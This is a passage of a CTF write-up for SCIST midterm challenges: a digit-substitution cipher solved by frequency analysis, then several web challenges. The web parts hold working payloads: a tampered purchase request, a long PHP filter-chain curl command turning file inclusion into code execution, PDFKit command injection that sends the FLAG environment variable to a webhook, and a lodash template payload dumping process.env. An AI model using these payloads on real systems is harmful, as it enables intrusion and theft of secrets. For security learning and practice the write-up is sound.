So the magic is all about statistics. We know that if the character is missing in the first row, then if exists, it must be a pair of number. And the "pair" of number is at second or third row, so it's about twice as frequent as the single number. We can count the frequency of pairs and find out which letter appears the most in the first of the pair.

Here is my ugly script modified from Curious and ChatGPT:

```python
import string

cipher = "477346730474537385477442744573854774427445714247949541424746484277142495744248734627442738457134549738424248946147024673545484535171467346754946744754846705464894649495424947738547471429535946735454854714957446495243047423025487442734945145257346484649424648427376454972477385475474648427714249574424873462484573494294574744248714271477346487146497171547734954107354548453738547744274455470482574573427145704249705427646487149467354548462467054648946494954249479464814945705714285758714224643245767384945075810734648712457646273573071424742497059427384294548484297354548734514524575435472574573427173454647548752421455487373451455487314673834549424698946494954249047427176573847734648714649719464949542494741073744648439464949542494794648414204742717657384507347575485359464873548734249342494248942765738424698457384249450734757142453424649243471495487573854754741429460474245373842714273842494714694246704652464124273457384294649495424947548945487349464773734573842714273842490474271414354242427384294649495424947846704246485487349548475994522547545484670455714648942474347734274768598548949424647424746704652464152573430482572424745744248427376454972734298484524575542474709846471469724273494671545945747404859467354548547484573257457342717345254842453475758737154773464894294548484297354548454954248734271474249705942547467046524641242548474574429573542470470462243414647427101454846942487349462804173451452457543349467442345497446737384251714673467549467454714954873427145484647744622479494522453146142495488427746714295744627657384246984597342734742146494673427141437685734247730334648714124697247730337384247949452245314614249547764946114271464945048714548422427545373842467054648946494954249464146487145371097373461425470474271734547429049427384271467346754946744742717542477384241464871765717385472574573427173457384224275242487573873842747305477046495464124246487114649467145775946224375424842494622435489494246474247765738548949424647427194649495424946754246734315946274730547745225754946744747457442714673467549467414671715487 57446434142484242714271014548494294251737384271097373461425474942744570427146487173842146142499451434537384271467346754946745474517359462243479464848427154873454642242973494548594622437349464847745737346412423454974479547733494240042489434648462434754754773842414247734517354548"
def find_kth_largest_with_position(lst, k):
    indexed_lst = list(enumerate(lst))  # Create a list of tuples with (index, value) pairs
    sorted_lst = sorted(indexed_lst, key=lambda x: x[1], reverse=True)  # Sort the list by values in descending order
    kth_largest = sorted_lst[k - 1]  # Get the k-th largest element (subtract 1 because indexing starts from 0)
    return kth_largest[1], kth_largest[0]  # Return the value and its original position

double_num_freq = [0] * 10
for i in range(10):
    for j in range(10):
        double_num_freq[i] += (cipher.count(str(i) +str(j)))

largest = find_kth_largest_with_position(double_num_freq,1)
second = find_kth_largest_with_position(double_num_freq,2)


cipher_char_list = []
i = 0
print(double_num_freq)
while i < len(cipher):
    if (cipher[i] == str(largest[1])) or (cipher[i] == str(second[1])):
        cipher_char_list.append(cipher[i: i + 2])
        i += 2
    else:
        cipher_char_list.append(cipher[i])
        i += 1

cipher_char_set = list(set(cipher_char_list))
map_list = string.ascii_lowercase[:len(cipher_char_set)]

new_cipher = ''
for c in cipher_char_list:
    new_cipher += map_list[cipher_char_set.index(c)]

print(new_cipher)
```

The rest is nothing but substitution cipher.

```text
statusofthismemothismemodescribesanexperimentalmethodfortheencapsulationofipdatagramsinaviancarriersthisspecificationisprimarilyusefulinmetropolitanareanetworksthisisanexperimentalnotrecommendedstandarddistributionofthismemoisunlimitedoverviewandrationalaviancarrierscanprovidehighdelaylowthroughputandlowaltitudeservicetheconnectiontopologyislimitedtoasinglepointtopointpathforeachcarrierusedwithstandardcarriersbutmanycarrierscanbeusedwithoutsignificantinterferencewitheachotheroutsideofearlyspringthisisbecauseofthedetherspaceavailabletothecarriersincontrasttothedetherusedbyieeethecarriershaveanintrinsiccollisionavoidancesystemwhichincreasesavailabilityunlikesomenetworktechnologiessuchaspacketradiocommunicationisnotlimitedtolineofsightdistanceconnectionorientedserviceisavailableinsomecitiesusuallybaseduponacentralhubtopologyframeformattheipdatagramisprintedonasmallscrollofpaperinhexadecimalwitheachoctetseparatedbywhitestuffandblackstuffthescrollofpaperiswrappedaroundonelegoftheaviancarrierabandofducttapeisusedtosecurethedatagramsedgesthebandwidthislimitedtotheleglengththemtuisvariableandparadoxicallygenerallyincreaseswithincreasedcarrierageatypicalmtuismilligramssomedatagrampaddingmaybeneededuponreceipttheducttapeisremovedandthepapercopyofthedatagramisopticallyscannedintoaelectronicallytransmittableformscistfrequencyanalysisisthebestoption
```

`SCIST{frequencyanalysisisthebestoption}` (Not sure if uppercase would be accepted)

FYI, according to curious' solution, he counted the frequency of each pair of digits which digits are the same (i.e. 00, 11, ...) The reason is left as exercise to the reader.(?)

## Web

### SCIST Shop

[http://lab.scist.org:10226/](http://lab.scist.org:10226/)

Using Burpsuite to capture request.

```text
POST /buy.php HTTP/1.1
Host: lab.scist.org:10226
Content-Length: 12
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://lab.scist.org:10226
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://lab.scist.org:10226/
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=e21d71587f7e7a6eca093ccabc02a599
Connection: close

id=4&money=1
```

Just hijack the request and change the money to some large number.

`SCIST{w0w!y0u_4RE_$o_H@rd_w0Rk}`

### Box

[http://lab.scist.org:20231/](http://lab.scist.org:20231/)

```text
FLAG at env
```

Trivial LFI. Like [http://lab.scist.org:20231//var/www/html/get.php](http://lab.scist.org:20231//var/www/html/get.php)

Some code from `index.php`

```php
<?php
error_reporting(0);
$file = $_GET['file'] ?? substr(urldecode($_SERVER['REQUEST_URI']),1);
if ($file == '') $file = 'welcome.php';
$list = Array(
    'Welcome' => '/welcome.php',
    'Get' => '/get.php',
    'Hint' => '/Dockerfile',
);
?>
```

However, I cannot include `proc/self/environ` to view the flag. And I cannot perform the classic LFI to RCE trick: send some malicious payload to "hijack" the log file. (View the log file and execute our payload).

Hint on website gave us Dockerfile.

```bash
FROM php:8.0-apache

RUN a2enmod rewrite && sed -i '/\.ht"/,+2 s/^#*/#/' /etc/apache2/apache2.conf

COPY ./ /var/www/html/
```

And the hint on CTFd is just pointing out that we have LFI.

IMO, I think they're useless.

So I read the [writeup](https://github.com/nella17/My-CTF-Challenges/tree/main/scist/scist-2022-midterm#box).

The most important thing is that "How to RCE with LFI?", so that's why I think the hint is useless...

It gave us three methods:

session.upload_progress [https://blog.orange.tw/2018/10/](https://blog.orange.tw/2018/10/)

PHP_INCLUDE_TO_SHELL_CHAR_DICT [https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)

pearcmd.php [https://github.com/w181496/Web-CTF-Cheatsheet#pear](https://github.com/w181496/Web-CTF-Cheatsheet#pear)

All of them are very useful and new to me. Learned a lot.

I like the php nested filter RCE the most.

Payload is from author. Notice that using curl to send request is better than using browser or python request. Browser just cannot load the page and python request also died, I don't know why...

```bash
$ curl -s http://lab.scist.org:20231/\?file\=php://filter/convert.iconv.UTF8.CSISO2022KR\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UCS2.EUCTW\|convert.iconv.L4.UTF8\|convert.iconv.IEC_P271.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.L7.NAPLPS\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.UCS-2LE.UCS-2BE\|convert.iconv.TCVN.UCS2\|convert.iconv.857.SHIFTJISX0213\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UCS2.EUCTW\|convert.iconv.L4.UTF8\|convert.iconv.866.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.L3.T.61\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UCS2.UTF8\|convert.iconv.SJIS.GBK\|convert.iconv.L10.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UCS2.UTF8\|convert.iconv.ISO-IR-111.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UCS2.UTF8\|convert.iconv.ISO-IR-111.UJIS\|convert.iconv.852.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UTF16.EUCTW\|convert.iconv.CP1256.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.L7.NAPLPS\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UCS2.UTF8\|convert.iconv.851.UTF8\|convert.iconv.L7.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.CP1133.IBM932\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.UCS-2LE.UCS-2BE\|convert.iconv.TCVN.UCS2\|convert.iconv.851.BIG5\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.UCS-2LE.UCS-2BE\|convert.iconv.TCVN.UCS2\|convert.iconv.1046.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UTF16.EUCTW\|convert.iconv.MAC.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.L7.SHIFTJISX0213\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UTF16.EUCTW\|convert.iconv.MAC.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UCS2.UTF8\|convert.iconv.ISO-IR-111.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.ISO6937.JOHAB\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.L6.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.UTF16LE\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.UCS2.UTF8\|convert.iconv.SJIS.GBK\|convert.iconv.L10.UCS2\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.iconv.UTF8.CSISO2022KR\|convert.iconv.ISO2022KR.UTF16\|convert.iconv.UCS-2LE.UCS-2BE\|convert.iconv.TCVN.UCS2\|convert.iconv.857.SHIFTJISX0213\|convert.base64-decode\|convert.base64-encode\|convert.iconv.UTF8.UTF7\|convert.base64-decode/resource\=/etc/passwd\&0\=env | grep -oE "SCIST{.*?}" --color=never
```

`SCIST{3asy?_LFI_2_RCE}`

(No, not easy at all...)

TODO: Setup local docker and see why I cannot perform traditional config trick or include `/proc/self/environ` directly.

**UPD**:
1. I set up the docker environment locally and found

```bash
www-data@box:~/html$ cat /proc/self/environ
HOSTNAME=boxPHP_VERSION=8.0.28APACHE_CONFDIR=/etc/apache2PHP_INI_DIR=/usr/local/etc/phpGPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4PHP_LDFLAGS=-Wl,-O1 -piePWD=/var/www/htmlHOME=/var/wwwPHP_SHA256=5e07278a1f315a67d36a676c01343ca2d4da5ec5bdb15d018e4248b3012bc0cdFLAG=SCIST{3asy?_LFI_2_RCE}PHPIZE_DEPS=autoconf              dpkg-dev               file             g++             gcc             libc-dev                make            pkg-config              re2cTERM=xtermPHP_URL=https://www.php.net/distributions/php-8.0.28.tar.xzSHLVL=1PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64APACHE_ENVVARS=/etc/apache2/envvarsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPHP_ASC_URL=https://www.php.net/distributions/php-8.0.28.tar.xz.ascPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64_=/bin/catwww-data@box:~/html$ ls -al /proc/self/environ
-r-------- 1 www-data www-data 0 May 28 06:12 /proc/self/environ
www-data@box:~/html$
```

Hmm, really weird...

After my deep exploring, I found it!

First I comment out `error_reporting(0);` in `index.php`, and yes! We got the desired error message.

```text
Warning
: include(/proc/19/mem): Failed to open stream: Permission denied in
/var/www/html/index.php
on line
44


Warning
: include(): Failed opening '/proc/self/mem' for inclusion (include_path='.:/usr/local/lib/php') in
/var/www/html/index.php
on line
44
```

Then we login shell as `www-data`

```
www-data@box:~/html$ ls -al /proc/19/environ
-r-------- 1 root root 0 May 28 06:32 /proc/19/environ
```

That's it, the environ of the 19 process is owned by root, so we cannot read it. I aloso found out that each time I include the file the process id is from 17 to 22. And I checked it with `top`, really strange: why there are 6 apache2 processes?

```bash
17 www-data  20   0   78404  14104   6648 S   0.0   0.2   0:00.00 apache2
18 www-data  20   0   78404  14092   6648 S   0.0   0.2   0:00.00 apache2
19 www-data  20   0   78404  14096   6648 S   0.0   0.2   0:00.00 apache2
20 www-data  20   0   78404  14096   6648 S   0.0   0.2   0:00.00 apache2
21 www-data  20   0   78404  14096   6648 S   0.0   0.2   0:00.00 apache2
22 www-data  20   0   78404  14096   6648 S   0.0   0.2   0:00.00 apache2
```

I think it's because when we are including `/proc/self/environ`, the pid is just different(?)

Yet another digging, I added `<?php echo getmypid();?>` in the index.php, and I found that the pid is always same as the `self` show in the error message, so they are the same process. I think anyone can access their own `proc/self/environ`, so it's really strange. I'm not sure it's php's security feature or something else. I'm so confused. (But it works fine when I setup local php server...)

After revisiting this writeup, I'm curious about is there any difference between self and real pid. I list them out:

```bash
www-data@box:~/html$ ls -al /proc/*/environ
-r-------- 1 root     root     0 May 28 07:02 /proc/1/environ
-r-------- 1 root     root     0 May 28 07:02 /proc/17/environ
-r-------- 1 root     root     0 May 28 07:02 /proc/18/environ
-r-------- 1 root     root     0 May 28 07:02 /proc/19/environ
-r-------- 1 root     root     0 May 28 07:02 /proc/20/environ
-r-------- 1 root     root     0 May 28 07:02 /proc/21/environ
-r-------- 1 www-data www-data 0 May 28 07:02 /proc/34/environ
-r-------- 1 www-data www-data 0 May 28 07:03 /proc/self/environ
-r-------- 1 www-data www-data 0 May 28 07:03 /proc/thread-self/environ
```

What? I can read `self/environ`, but `self` is actually one of 17 to 21? (Pid 22 is missing here, I dunno why either) I can and I can't read myself? What da hail! I'm so confused...

### PDF Generator

Tag: `SCIST 3rd Midterm`

Author : nella17

[http://lab.scist.org:20232](http://lab.scist.org:20232)

```text
FLAG at env
```

This challenge gave us the source code and the Gemfile of a Sinatra app. The app is a simple web page that allows us to enter a URL and generate a PDF of that page. The app uses the PDFKit < 0.8.7.2, which is vulnerable to command injection. POC can be found online easily.

The vulnerability is in the `PDFKit.new` function. It takes a string as the argument, and it will be passed to `wkhtmltopdf` as the URL to be converted to PDF. The string is not sanitized, so we can inject command into it. You can test it with typing some weird URL and broke the app. The debugging page shows the command is like `/usr/bin/wkhtmltopdf --quiet --page-size Letter --margin-top 0.75in --margin-right 0.75in --margin-bottom 0.75in --margin-left 0.75in --encoding UTF-8 {Input Here}`.

```ruby
require 'pdfkit'
require 'sinatra'

set :bind, '0.0.0.0'
set :port, 80
set :public_folder, __dir__

get '/' do
  erb :index
end

get '/pdf' do
  puts params
  content_type :pdf
  PDFKit.new(params['url']).to_pdf
end
```

However, maybe due to weird URL encoding stuff, I cannot use payload online and execute sleep 5 to prove that I have RCE. But the web says flag is in the environment variable. So I tried to callback webhook website with generating PDF of `http://webhook/$FLAG`. And I got the flag. (Need to guess that flag is in the environment variable `FLAG`...) And I think this is not the intended solution.

```
SCIST{Cm4i_PDFk1t_w/_Ruby}
```

**Update**: According to [author](https://github.com/nella17/My-CTF-Challenges/tree/main/scist/scist-2022-midterm), his writeup says command injection is the intended solution. But the exploit script is using callback FLAG in the environment variable(?).

TODO: Setup local environment and test the param.

### Template

Author : nella17

[http://lab.scist.org:20233/](http://lab.scist.org:20233/)

There is a hint in the source code. 

```html
<a class="hint" href="/leak/Dockerfile"></a>
```

`Dockerfile`:

```text
FROM node:18

WORKDIR /app
COPY package*.json ./
RUN npm ci

COPY ./ ./

CMD ["bash", "-c", "timeout 60 node app.js"]
```

According to some common sense, we know `package*.json` is actually `package.json` and `package-lock.json`, we can leak `package.json`

```json

{
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "^4.17.20"
  }
}
```

Express is not vulnerable, what about lodash?

We can easily find [CVE-2021-23337](https://security.snyk.io/vuln/SNYK-JS-LODASH-1040724). Re-search other's payload and boom! We got the flag.

Payload:

```javascript
${JSON.stringify(process.env)}
```

Response:

```json
{"HOSTNAME":"template","YARN_VERSION":"1.22.19","PWD":"/app","HOME":"/root","FLAG":"SCIST{Opt1ons_injecti0n_in_loda5h}","SHLVL":"0","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","NODE_VERSION":"18.16.0","_":"/usr/bin/timeout"}
```

Actually my solution is just directly search for `lodash js ssti` and found [https://hackerone.com/reports/904672](https://hackerone.com/reports/904672).

`SCIST{Opt1ons_injecti0n_in_loda5h}`
